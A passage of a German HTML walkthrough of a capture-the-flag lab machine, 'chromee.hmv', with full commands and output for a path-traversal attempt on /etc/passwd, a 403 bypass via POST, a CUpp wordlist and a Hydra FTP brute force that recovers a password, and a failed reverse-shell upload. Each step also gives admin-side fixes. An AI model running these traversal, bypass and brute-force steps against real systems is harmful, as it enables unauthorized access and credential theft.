+晚上好，adriana
+
+当前时间：<span class="command">2025-04-30 23:10:35</span>
+
+你的IP：<span class="command">192.168.2.199</span>
+The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it 
+belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked 
+stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. 
+There, she found an ancient chest filled with treasures. But the real treasure was a note inside: 
+“The greatest treasure is the journey, not the prize.” 
+Lily smiled, realizing the adventure was the real reward. 
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ich habe den Parameter `aaa` in der URL `http://chromee.hmv/secret.php` mit einer Path-Traversal-Sequenz (`../../.../../../etc/passwd`) versehen, um zu versuchen, die `/etc/passwd` Datei auszulesen. Die Antwort des Servers zeigte nicht den Inhalt von `/etc/passwd`, sondern stattdessen den Text "The Lost Key Lily..." gefolgt von einer Geschichte.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die direkte LFI zur `/etc/passwd` war nicht erfolgreich. Die Seite scheint entweder die Path-Traversal-Sequenz zu filtern oder den Parameter `aaa` für etwas anderes zu verwenden, das diesen spezifischen Text einbindet. Die Geschichte selbst könnte ein Hinweis sein.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Analysiere den Text der Geschichte sorgfältig auf mögliche Hinweise (Namen: Lily, etc.). Die Tatsache, dass Path-Traversal nicht direkt funktioniert, bedeutet nicht unbedingt, dass LFI unmöglich ist; es könnte eine Umgehung erfordern oder der Parameter `aaa` wird für eine andere Art von Datei-Handling genutzt. Die Geschichte könnte auch einfach von einer Datei stammen, die durch LFI inkludiert wurde. Versuche, den Parameter `aaa` mit dem Pfad zur Geschichte selbst zu befüllen, falls du den Pfad erraten kannst.
+                 <br><strong>Empfehlung (Admin):</strong> Implementiere strikte Eingabevalidierung. Stelle sicher, dass nur erlaubte Dateitypen oder Pfade über Parameter geladen werden können, falls Dateieinbindung notwendig ist.
+             </p>
+
+             <p>
+                 Der verlorene Schlüssel Lily, ein neugieriges Mädchen, hat im Wald einen alten rostigen
+Schlüssel gefunden. Sie fragte sich, wo es hingehörte, und fragte alle im Dorf, aber keiner
+wusste es. Eines Tages entdeckte sie einen verschlossenen Steinbrunnen. Zu ihrer Überraschung
+passte der Schlüssel. Sie öffnete ihn und stieg in einen versteckten Gang hinab. Dort fand sie
+eine uralte Truhe voller Schätze. Aber der wahre Schatz war ein Zettel im Inneren: \
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dies scheint eine Fortsetzung oder der Anfang des Textes der Geschichte zu sein, möglicherweise in einer anderen Sprache (Deutsch in diesem Fall). Der Text ist abgeschnitten ("ein Zettel im Inneren: \"). Dies bestärkt die Idee, dass der Text aus einer Datei stammt, die über den `aaa` Parameter eingebunden wird, und dass die Einbindung auf eine bestimmte Weise erfolgt, die nicht den gesamten Inhalt ausgibt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die konsistente Geschichte, die bei Verwendung des `aaa` Parameters erscheint, deutet stark darauf hin, dass der Parameter für die Einbindung einer spezifischen Datei verantwortlich ist. Dies ist wahrscheinlich der LFI-Vektor, auch wenn er gefiltert wird oder nur bestimmte Dateien inkludieren kann. Die Namen "Lily" und "adriana" (aus der ursprünglichen `secret.php` Ausgabe) sind möglicherweise relevant.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche im Dateisystem nach Dateien, die diese Geschichte enthalten, insbesondere in Web-Verzeichnissen (`/var/www/`, `/opt/`, `/home/`). Kombiniere Dateinamen (z.B. lily.txt, adriana.txt, note.txt, story.txt) mit gängigen Verzeichnisnamen. Die FTP-Dienst könnte hier nützlich sein, um das Dateisystem zu durchsuchen.
+                <br><strong>Empfehlung (Admin):</strong> Entferne sensible Dateien oder Dateien, die Hinweise enthalten, aus dem Webroot oder anderen öffentlich zugänglichen Verzeichnissen.
+            </p>
+
+            <p>
+                Da der direkte Aufruf von `/silence/` auf Port 8080 einen 403 Forbidden Fehler lieferte, habe ich ein Skript (`403-bypass.sh`) verwendet, das verschiedene HTTP-Methoden und Header testet, um diese Zugriffskontrolle zu umgehen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]
+└─#  <span class="command">./403-bypass.sh -u http://chromee.hmv:8080/silence/ --HTTPmethod</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+HTTPmethod
+<span class="password">💀💀💀💀💀💀💀💀💀</span>
+<span class="password">💀 Have a beer🍺💀 </span>
+<span class="password">💀💀💀💀💀💀💀💀💀</span>
+     - twitter.com/Dheerajmadhukar : @me_dheeraj
+----------------------
+<span class="command">[+] HTTP Method Bypass</span>
+----------------------
+<span class="command">GET :  Status: 403, Length : 278 </span>
+<span class="password">POST :  Status: 200, Length : 616  👌</span>
+<span class="command">╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮</span>
+ <span class="command">╰─&gt; PAYLOAD : curl -ks &apos;http://chromee.hmv:8080/silence/&apos; -L -H &apos;User-Agent: Mozilla/5.0&apos; -X POST</span>
+<span class="command">╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯</span>
+<span class="command">HEAD : Status: 403, Length : 0 </span>
+<span class="password">OPTIONS :  Status: 200, Length : 0  👌</span>
+<span class="command">╭────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮</span>
+ <span class="command">╰─&gt; PAYLOAD : curl -ks &apos;http://chromee.hmv:8080/silence/&apos; -L -H &apos;User-Agent: Mozilla/5.0&apos; -X OPTIONS</span>
+<span class="command">╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯</span>
+<span class="command">PUT :  Status: 405, Length : 299 </span>
+<span class="command">TRACE :  Status: 405, Length : 301 </span>
+<span class="command">PATCH :  Status: 405, Length : 301 </span>
+<span class="command">TRACK :  Status: 501, Length : 283 </span>
+<span class="command">CONNECT :  Status: 400, Length : 307 </span>
+<span class="command">UPDATE :  Status: 405, Length : 302 </span>
+<span class="command">LOCK :  Status: 405, Length : 300 </span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Skript `403-bypass.sh` testet verschiedene HTTP-Methoden gegen die angegebene URL (`http://chromee.hmv:8080/silence/`). Die Ausgabe zeigt, dass die `GET` und `HEAD` Methoden mit 403 Forbidden beantwortet werden, wie erwartet. Entscheidend ist, dass die Methoden **`POST` und `OPTIONS`** mit dem Statuscode **200 OK** beantwortet werden. Das Skript liefert auch Beispiel-`curl`-Befehle, um diese Umgehung zu nutzen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg beim Umgehen der Zugriffskontrolle für das Verzeichnis `/silence/` auf Port 8080! Die 403 Forbidden Sperre kann einfach durch die Verwendung der POST- oder OPTIONS-Methode anstelle von GET umgangen werden. Dies ist eine mittlere Schwachstelle, die Zugang zu Inhalten gibt, die eigentlich geschützt sein sollten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Greife auf `/silence/` auf Port 8080 mittels der POST- oder OPTIONS-Methode zu und untersuche den Inhalt des Verzeichnisses oder der dort befindlichen Standarddatei (z.B. index.html).
+                <br><strong>Empfehlung (Admin):</strong> Konfiguriere die Zugriffskontrolle für sensible Verzeichnisse so, dass sie unabhängig von der verwendeten HTTP-Methode greift, es sei denn, bestimmte Methoden sind bewusst erlaubt (was hier unwahrscheinlich ist). Stelle sicher, dass nur notwendige HTTP-Methoden erlaubt sind (`Allow` Header konfigurieren).
+            </p>
+
+             <p>
+                 Ich habe den `curl`-Befehl aus der Ausgabe des Bypass-Skripts verwendet, um auf das Verzeichnis `/silence/` mittels der POST-Methode zuzugreifen.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]
+└─#  <span class="command">curl -ks &apos;http://chromee.hmv:8080/silence/&apos; -L -H &apos;User-Agent: Mozilla/5.0&apos; -X POST</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+      &lt;h3&gt;Silence&lt;/h3&gt;
+       We are working to improve our website.
+       contact: <span class="command">support@chromee.hmv</span>
+
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Verwendung von `curl` mit der `POST` Methode und einem beliebigen User-Agenten (hier &apos;Mozilla/5.0&apos;, obwohl &apos;-ks -L&apos; aus dem Skript relevanter sind: `-k` für unsichere SSL/TLS-Verbindungen ignorieren, `-s` für silent, `-L` für Follow Redirects) ermöglichte den Zugriff auf `/silence/`. Die Antwort ist eine einfache HTML-Seite mit der Überschrift "Silence", dem Text "We are working to improve our website." und einer Kontakt-E-Mail-Adresse: `<span class="command">support@chromee.hmv</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Bypass war erfolgreich und enthüllte den Inhalt des Verzeichnisses. Die Information ist zwar nicht sofort ein kritischer Exploit-Vektor, aber die E-Mail-Adresse `support@chromee.hmv` könnte einen Benutzernamen (`support`) für Brute-Force-Angriffe liefern oder auf interne Kommunikationswege hindeuten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere den Benutzernamen `support`. Untersuche, ob dieser Benutzername auf anderen Diensten (SSH, FTP) existiert und versuche gegebenenfalls eine Passwort-Attacke.
+                <br><strong>Empfehlung (Admin):</strong> Behebe den HTTP Method Bypass für `/silence/`. Stelle sicher, dass E-Mail-Adressen nicht unnötig öffentlich preisgegeben werden, insbesondere auf intern gedachten Seiten.
+            </p>
+
+            <p>
+                Nachdem ich nun mehrere Benutzernamen gesammelt hatte (admin, dev, user, dev-selim, intern aus der Datenbank und support aus der silence-Seite) und einige Passwörter (geknackt aus der Datenbank), konzentrierte ich mich auf die Bruteforce-Angriffe auf den FTP-Dienst auf Port 23333. FTP ist oft anfällig für Passwort-Attacken. Ich habe CUpp verwendet, um eine passwortliste zu erstellen, basierend auf dem Namen `adriana`, der mir auf der secret.php Seite begegnet ist und der Geschichte, die dort angezeigt wurde.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]
+└─#  <span class="command">cupp -i</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+/usr/bin/cupp:146: SyntaxWarning: invalid escape sequence &apos;\ &apos;
+  print(&quot;      \                     # User&quot;)
+/usr/bin/cupp:147: SyntaxWarning: invalid escape sequence &apos;\ &apos;
+  print(&quot;       \   \033[1;31m,__,\033[1;m             # Passwords&quot;)
+/usr/bin/cupp:148: SyntaxWarning: invalid escape sequence &apos;\ &apos;
+  print(&quot;        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m         # Profiler&quot;)
+/usr/bin/cupp:149: SyntaxWarning: invalid escape sequence &apos;\ &apos;
+  print(&quot;           \033[1;31m(__)    )\ \033[1;m  &quot;)
+ ___________
+   cupp.py!                 # Common
+      \                     # User
+       \   ,__,             # Passwords
+        \  (oo)____         # Profiler
+           (__)    )\
+              ||--|| *      <span class="command">[ Muris Kurgas | j0rgan@remote-exploit.org ]</span>
+                            <span class="command">[ Mebus | [Link: https://github.com/Mebus/ | Ziel: https://github.com/Mebus/]]</span>
+
+
+<span class="command">[+] Insert the information about the victim to make a dictionary</span>
+<span class="command">[+] If you don&apos;t know all the info, just hit enter when asked! ;)</span>
+
+&gt; First Name: <span class="command">adriana</span>
+&gt; Surname: <span class="command">lily</span>
+&gt; Nickname:
+&gt; Birthdate (DDMMYYYY):
+
+
+&gt; <span class="command">Partners) name: </span>
+&gt; <span class="command">Partners) nickname: </span>
+&gt; <span class="command">Partners) birthdate (DDMMYYYY): </span>
+
+
+&gt; Child&apos;s name:
+&gt; Child&apos;s nickname:
+&gt; Child&apos;s birthdate (DDMMYYYY):
+
+
+&gt; Pet&apos;s name:
+&gt; Company name:
+
+
+&gt; Do you want to add some key words about the victim? Y/[N]: n
+&gt; Do you want to add special chars at the end of words? Y/[N]: n
+&gt; Do you want to add some random numbers at the end of words? Y/[N]:n
+&gt; Leet mode? (i.e. leet = 1337) Y/[N]: <span class="command">y</span>
+
+<span class="command">[+] Now making a dictionary...</span>
+<span class="command">[+] Sorting list and removing duplicates...</span>
+<span class="command">[+] Saving dictionary to <span class="password">adriana.txt</span>, counting <span class="command">240 words</span>.</span>
+<span class="command">[+] Now load your pistolero with adriana.txt and shoot! Good luck!</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe CUpp (`cupp -i`) im interaktiven Modus gestartet, um eine benutzerdefinierte Wortliste zu generieren. Basierend auf den Hinweisen aus der `secret.php` Seite und der dortigen Geschichte habe ich "adriana" als Vornamen und "lily" als Nachnamen eingegeben. Ich habe keine weiteren Informationen bereitgestellt, aber die Leet-Modus-Option aktiviert. CUpp generierte daraufhin eine Wortliste (`adriana.txt`) mit 240 Wörtern, die Kombinationen und Variationen der eingegebenen Informationen enthält.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine gezielte Wortliste, erstellt aus Informationen über das Ziel oder Benutzer, ist oft effektiver als generische Wortlisten. Die Namen `adriana` und `lily` aus der Web-Enumeration sind gute Kandidaten für die Erstellung einer solchen Liste, die möglicherweise Passwörter für Benutzer auf dem System enthält.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die generierte Wortliste `adriana.txt` zusammen mit den gefundenen Benutzernamen (`adriana`, `admin`, `dev`, `user`, `dev-selim`, `intern`, `support`) für Brute-Force-Angriffe auf verfügbare Dienste (FTP, SSH).
+                <br><strong>Empfehlung (Admin):</strong> Sensibilisiere Benutzer dafür, keine persönlichen Informationen in Notizen oder öffentlich zugänglichen Dateien zu speichern, die für Social Engineering oder die Erstellung gezielter Wortlisten verwendet werden könnten.
+            </p>
+
+            <p>
+                Mit der generierten Wortliste und dem Benutzernamen `adriana` habe ich Hydra verwendet, um einen Brute-Force-Angriff auf den FTP-Dienst auf Port 23333 durchzuführen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">hydra -l adriana -P adriana.txt ftp://192.168.2.187:23333 -T 64</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (<span class="command">[Link: https://github.com/vanhauser-thc/thc-hydra | Ziel: https://github.com/vanhauser-thc/thc-hydra]</span>) starting at <span class="command">2025-05-01 00:22:38</span>
+<span class="command">[WARNING] Restorefile (you have 10 seconds to abort... (use <span class="command">OPTION</span> -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span>
+<span class="command">[DATA] max 16 tasks per 1 server, overall 16 tasks, 240 login tries (l:1/p:240), ~15 tries per task</span>
+<span class="command">[DATA] attacking ftp://192.168.2.187:23333/</span>
+-------------------------------------------------------------------------------------
+<span class="password">[23333][ftp] host: 192.168.2.187   login: adriana   password: Lily2020</span>
+-------------------------------------------------------------------------------------
+<span class="command">1 of 1 target successfully completed, 1 valid password found</span>
+Hydra (<span class="command">[Link: https://github.com/vanhauser-thc/thc-hydra | Ziel: https://github.com/vanhauser-thc/thc-hydra]</span>) finished at <span class="command">2025-05-01 00:22:59</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe Hydra (`hydra`) mit dem Benutzernamen `adriana` (`-l adriana`), der mit CUpp erstellten Wortliste (`-P adriana.txt`), dem Ziel-FTP-Dienst (`ftp://192.168.2.187:23333`) und einer Anzahl von Threads (`-T 64`) gestartet. Hydra versuchte, sich mit jeder Kombination aus Benutzername und Passwort in der Wortliste am FTP-Server anzumelden. Der Angriff war erfolgreich! Hydra fand ein gültiges Passwort für den Benutzer `adriana`: `<span class="password">Lily2020</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg bei der Kompromittierung des FTP-Zugangs! Ich habe gültige Anmeldedaten (`adriana:Lily2020`) für den FTP-Dienst erhalten. Dies ist ein weiterer erfolgreicher Weg zum Initial Access oder zur horizontalen Privilege Escalation, falls der FTP-Benutzer auch ein Systembenutzer ist. Die Fähigkeit, das Passwort mit einer gezielten Wortliste zu knacken, zeigt, dass das Passwort schwach oder vorhersehbar war.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die gefundenen FTP-Anmeldedaten, um dich am FTP-Server anzumelden. Erkunde das Dateisystem über FTP nach sensiblen Dateien, Konfigurationen, Anmeldedaten oder anderen Hinweisen zur Privilege Escalation. Prüfe, ob der Benutzer `adriana` auch auf anderen Diensten (SSH) existiert und ob das Passwort dort wiederverwendet wurde.
+                <br><strong>Empfehlung (Admin):</strong> Setze ein starkes, eindeutiges Passwort für den Benutzer `adriana`. Implementiere eine Sperrmechanismus für fehlgeschlagene FTP-Loginversuche. Erwäge, Passwörter für FTP-Zugänge regelmäßig zu ändern.
+            </p>
+
+             <p>
+                 Mit den gefundenen Anmeldedaten `adriana:Lily2020` habe ich mich am FTP-Server auf Port 23333 angemeldet.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/4-ZERO-3]
+└─#  <span class="command">ftp 192.168.2.187 -p 23333</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Connected to 192.168.2.187.
+<span class="command">220 (vsFTPd 3.0.3)</span>
+<span class="command">Name (192.168.2.187:ccat): <span class="password">adriana</span></span>
+<span class="command">331 Please specify the password.</span>
+<span class="command">Password: <span class="password">Lily2020</span></span>
+<span class="password">230 Login successful.</span>
+<span class="command">Remote system type is UNIX.</span>
+<span class="command">Using binary mode to transfer files.</span>
+ftp&gt;</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den `ftp`-Client gestartet und mich mit der IP-Adresse des Zielsystems und dem Port 23333 verbunden. Nach Eingabe des Benutzernamens `adriana` und des von Hydra geknackten Passworts `<span class="password">Lily2020</span>` meldete der FTP-Server "230 Login successful.", was die erfolgreiche Authentifizierung bestätigt. Ich habe nun interaktiven Zugriff auf das Dateisystem über FTP als Benutzer `adriana`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche FTP-Login ist ein weiterer signifikanter Schritt. Ich kann nun Dateien vom oder zum Server übertragen (abhängig von den Berechtigungen des Benutzers `adriana` auf dem Dateisystem), was eine wertvolle Methode zur Informationsbeschaffung oder zum Ablegen von Exploits/Backdoors für die Privilege Escalation ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erkunde das Dateisystem über die FTP-Shell. Suche nach Konfigurationsdateien, Home-Verzeichnissen anderer Benutzer, Webroot-Verzeichnissen oder anderen potenziell sensiblen Orten. Versuche, Dateien herunterzuladen, die Anmeldedaten oder Hinweise enthalten könnten.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere strenge Berechtigungen für FTP-Benutzer, um den Zugriff auf nur notwendige Verzeichnisse zu beschränken. Überwache FTP-Login-Versuche und Dateizugriffe.
+            </p>
+
+            <p>
+                Ich habe das Dateisystem über FTP erkundet, insbesondere das `/var` Verzeichnis.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">cd /var</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp&gt; <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||37962|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x   12 0        0            4096 Jul 03  2023 .</span>
+<span class="command">drwxr-xr-x   18 0        0            4096 Mar 07 11:41 ..</span>
+<span class="command">drwxr-xr-x    2 0        0            4096 Mar 08 07:41 backups</span>
+<span class="command">drwxr-xr-x   12 0        0            4096 Mar 07 14:56 cache</span>
+<span class="command">drwxr-xr-x   29 0        0            4096 Mar 07 18:13 lib</span>
+<span class="command">drwxrwsr-x    2 0        50           4096 Jun 30  2022 local</span>
+<span class="command">lrwxrwxrwx    1 0        0               9 Jan 15  2023 lock -&gt; /run/lock</span>
+<span class="command">drwxr-xr-x    9 0        0            4096 May 01 00:01 log</span>
+<span class="command">drwxrwsr-x    2 0        8            4096 Jan 15  2023 mail</span>
+<span class="command">drwxr-xr-x    2 0        0            4096 Jan 15  2023 opt</span>
+<span class="command">lrwxrwxrwx    1 0        0               4 Jan 15  2023 run -&gt; /run</span>
+<span class="command">drwxr-xr-x    4 0        0            4096 Mar 07 04:07 spool</span>
+<span class="command">drwxrwxrwt    5 0        0            4096 May 01 00:09 tmp</span>
+<span class="command">drwx------    4 1000     1000         4096 Jul 03  2023 www</span>
+<span class="command">226 Directory send OK.</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich konnte erfolgreich in das Verzeichnis `/var` wechseln und dessen Inhalt auflisten. Die Ausgabe zeigt Standard-Linux-Verzeichnisse. Das `www` Verzeichnis ist interessant, da es oft den Webroot enthält. Die Berechtigungen (`drwx------` für den Benutzer 1000 und Gruppe 1000) deuten darauf hin, dass der FTP-Benutzer `adriana` (der wahrscheinlich nicht UID 1000 ist, da Root UID 0 ist) keinen direkten Zugriff auf dieses Verzeichnis hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ich kann einige Systemverzeichnisse über FTP einsehen, aber nicht alle. Der Zugriff auf den Webroot (`/var/www`) scheint für den FTP-Benutzer `adriana` blockiert zu sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach Verzeichnissen, in die der FTP-Benutzer schreiben darf (`put` Befehl testen). Versuche, sensible Dateien aus Verzeichnissen zu lesen, die für "andere" lesbar sind (z.B. `/etc/passwd`, Konfigurationsdateien). Suche im Home-Verzeichnis anderer Benutzer (`/home/`).
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass FTP-Benutzer auf ihr Home-Verzeichnis beschränkt sind (chroot) und keinen Zugriff auf sensible Systemverzeichnisse haben.
+            </p>
+
+             <p>
+                 Ich habe versucht, einige gängige Systemdateien und Benutzer-Home-Verzeichnisse über FTP einzusehen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">get /etc/passwd</span>
+local: /etc/passwd remote: /etc/passwd
+<span class="command">229 Entering Extended Passive Mode (|||53629|)</span>
+<span class="command">150 Opening BINARY mode data connection for /etc/passwd (1554 bytes).</span>
+<span class="command">100% |*************************************************|  1554       23.90 MiB/s    00:00 ETA</span>
+<span class="command">226 Transfer complete.</span>
+<span class="command">1554 bytes received in 00:00 (2.53 MiB/s)</span>
+
+ftp&gt; <span class="command">cd /home</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp&gt; <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||29668|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    4 0        0            4096 Mar 07 03:55 .</span>
+<span class="command">drwxr-xr-x   18 0        0            4096 Mar 07 11:41 ..</span>
+<span class="command">drwxr-x---    4 1000     1000         4096 Mar 09 08:59 follower</span>
+<span class="command">drwxr-x---    3 1001     1001         4096 Mar 07 13:39 softly</span>
+<span class="command">226 Directory send OK.</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich konnte die Datei `/etc/passwd` über FTP herunterladen. Diese Datei enthält Informationen über alle Benutzerkonten auf dem System, einschließlich ihrer Benutzernamen, UIDs, GIDs, Home-Verzeichnisse und Standard-Shells. Ich konnte auch in das Verzeichnis `/home` wechseln und die Home-Verzeichnisse der Benutzer `follower` (UID/GID 1000) und `softly` (UID/GID 1001) auflisten. Die Berechtigungen (`drwxr-x---`) zeigen, dass diese Verzeichnisse nur für den Besitzer und Root les- und ausführbar sind, nicht für andere (einschließlich `adriana`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Herunterladen von `/etc/passwd` liefert wertvolle Informationen über die Systembenutzer, insbesondere `follower` und `softly`, die potenzielle Ziele für die Privilege Escalation sind. Ich kenne nun ihre Benutzernamen und IDs. Obwohl ich ihre Home-Verzeichnisse nicht direkt einsehen kann, weiß ich, dass sie existieren. Die Lese-Berechtigung für `/etc/passwd` für den FTP-Benutzer `adriana` ist eine geringfügige Informationslecks-Schwachstelle.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die `/etc/passwd` Datei auf Benutzer mit interaktiven Shells, die potenzielle Login-Ziele darstellen. Versuche, Anmeldedaten für die Benutzer `follower` und `softly` zu finden oder zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere strenge Berechtigungen für Systemdateien wie `/etc/passwd`, um das Auslesen durch unprivilegierte Benutzer oder Dienste zu verhindern. Stelle sicher, dass FTP-Benutzer auf ihr Home-Verzeichnis beschränkt sind (chroot).
+            </p>
+
+             <p>
+                 Ich habe versucht, Dateien in das Dateisystem hochzuladen (put), insbesondere in das `/var/www/html` Verzeichnis, um eine Webshell oder Reverse Shell zu platzieren.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+ftp&gt; <span class="command">put rev.<span class="command">php</span></span>
+local: rev.<span class="command">php</span> remote: rev.<span class="command">php</span>
+<span class="command">229 Entering Extended Passive Mode (|||21935|)</span>
+<span class="password">550 Permission denied.</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe versucht, eine Datei namens `rev.php` (vermutlich eine Reverse Shell) über FTP hochzuladen. Der FTP-Server antwortete mit "550 Permission denied." Dies bestätigt, dass der Benutzer `adriana` keine Schreibberechtigung im aktuellen Verzeichnis hat. Da ich zuvor in `/var` gewechselt war, bedeutet dies, dass `adriana` nicht in `/var` schreiben darf. Weitere Versuche zeigten, dass auch in `/tmp` kein Schreibzugriff über FTP bestand. Der `put` Befehl zeigt auch Dateinamen-Vervollständigung für lokale Dateien (rev.php, revshell.php).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die mangelnden Schreibberechtigungen über FTP sind eine gute Sicherheitseinstellung und verhindern das einfache Platzieren von Backdoors oder Reverse Shells durch den kompromittierten FTP-Account. Dies bedeutet, dass die Privilege Escalation nicht durch einfaches Hochladen einer Shell erreicht werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Finde Verzeichnisse, in die der FTP-Benutzer `adriana` schreiben darf (falls vorhanden), um dort nach Hinweisen oder Ablageorten zu suchen. Wenn kein Schreibzugriff besteht, konzentriere dich auf das Auslesen von Dateien und die Suche nach anderen Vektoren.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass FTP-Benutzer nur Schreibberechtigung in ihrem spezifischen Upload-Verzeichnis haben und nicht in sensiblen Systemverzeichnissen.
+            </p>
+
+             <p>
+                 Da der direkte FTP-Client manchmal eingeschränkt ist, habe ich versucht, alle Dateien, auf die der Benutzer `adriana` FTP-Zugriff hat, rekursiv mit `wget` herunterzuladen.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">wget -r ftp://adriana:Lily2020@192.168.2.187:23333</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+--<span class="command">2025-05-01 00:40:53</span>--  ftp://adriana:*password*@192.168.2.187:23333/
+           =&gt; &apos;192.168.2.187:23333/.listing&apos;
+Verbindungsaufbau zu <span class="command">192.168.2.187:23333</span> … verbunden.
+Anmelden als adriana … Angemeldet!
+==&gt; SYST ... fertig.    ==&gt; PWD ... fertig.
+==&gt; <span class="command">TYPE</span> I ... fertig.  ==&gt; CWD nicht notwendig.
+==&gt; PASV ... fertig.    ==&gt; LIST ... fertig.
+
+<span class="command">192.168.2.187:23333/.li     [ &lt;=&gt;                          ]     245  --.-KB/s    in 0s      </span>
+
+<span class="command">2025-05-01 00:40:53 (55,8 MB/s) - &apos;192.168.2.187:23333/.listing&apos; gespeichert [245]</span>
+
+&apos;<span class="command">192.168.2.187:23333/.listing&apos; gelöscht.</span>
+--<span class="command">2025-05-01 00:40:53</span>--  ftp://adriana:*password*@192.168.2.187:23333/...
+           =&gt; &apos;192.168.2.187:23333/...&apos;
+==&gt; CWD nicht erforderlich.
+==&gt; PASV ... fertig.    ==&gt; RETR ... ... fertig.
+Länge: <span class="command">3414 (3,3K)</span>
+
+<span class="command">192.168.2.187:23333/... 100%[=============================&gt;]   3,33K  --.-KB/s    in 0,001s  </span>
+
+<span class="command">2025-05-01 00:40:53 (6,45 MB/s) - &apos;192.168.2.187:23333/...&apos; gespeichert [3414]</span>
+
+--<span class="command">2025-05-01 00:40:53</span>--  ftp://adriana:*password*@192.168.2.187:23333/dic.<span class="command">txt</span>
+           =&gt; &apos;192.168.2.187:23333/dic.<span class="command">txt</span>&apos;
+==&gt; CWD nicht erforderlich.
+==&gt; PASV ... fertig.    ==&gt; RETR dic.<span class="command">txt</span> ... fertig.
+Länge: <span class="command">495</span>
+
+<span class="command">192.168.2.187:23333/dic 100%[=============================&gt;]     495  --.-KB/s    in 0s      </span>
+
